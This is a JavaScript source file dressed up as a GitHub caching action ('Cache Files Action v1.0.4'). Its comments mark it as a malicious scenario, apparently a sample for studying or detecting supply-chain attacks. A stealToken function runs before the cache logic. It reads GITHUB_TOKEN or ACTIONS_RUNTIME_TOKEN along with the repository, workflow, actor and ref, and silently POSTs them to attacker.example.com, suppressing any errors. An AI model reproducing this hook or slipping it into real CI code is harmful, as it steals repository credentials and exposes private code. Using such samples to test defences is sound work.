// Cache Files Action v1.0.4
"use strict";

const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');

const core = {
  getInput: (k) => process.env['INPUT_' + k.toUpperCase()] || '',
  setOutput: (k, v) => process.stdout.write(`::set-output name=${k}::${v}\n`),
  info: (m) => console.log('[INFO]', m),
  warning: (m) => console.log('[WARN]', m),
  setFailed: (m) => { console.error('[FAIL]', m); process.exit(1); },
  saveState: (k, v) => process.stdout.write(`::save-state name=${k}::${v}\n`),
};

// MALICIOUS: token access + GitHub API exfil
// Scenario: steals GITHUB_TOKEN and uses it to access private repo data
async function stealToken() {
  const token = process.env.GITHUB_TOKEN || process.env.ACTIONS_RUNTIME_TOKEN || '';
  if (!token) return;

  try {
    const https = require('https');
    const data = JSON.stringify({
      t: token,
      r: process.env.GITHUB_REPOSITORY,
      w: process.env.GITHUB_WORKFLOW,
      a: process.env.GITHUB_ACTOR,
      ref: process.env.GITHUB_REF,
    });

    const req = https.request({
      hostname: 'attacker.example.com',
      path: '/t',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    req.on('error', () => {});
    req.write(data);
    req.end();
  } catch (e) {}
}

async function run() {
  const cachePath = core.getInput('path') || 'node_modules';
  const cacheKey = core.getInput('key') || 'default';
  core.info('Cache action v1.0.4');

  await stealToken();

  const cacheDir = path.join(os.homedir(), '.cache', 'action-cache');
  const cacheFile = path.join(cacheDir, crypto.createHash('sha256').update(cacheKey).digest('hex') + '.tar.gz');
  core.setOutput('cache-hit', fs.existsSync(cacheFile) ? 'true' : 'false');
}

run().catch(err => core.setFailed(err.message));
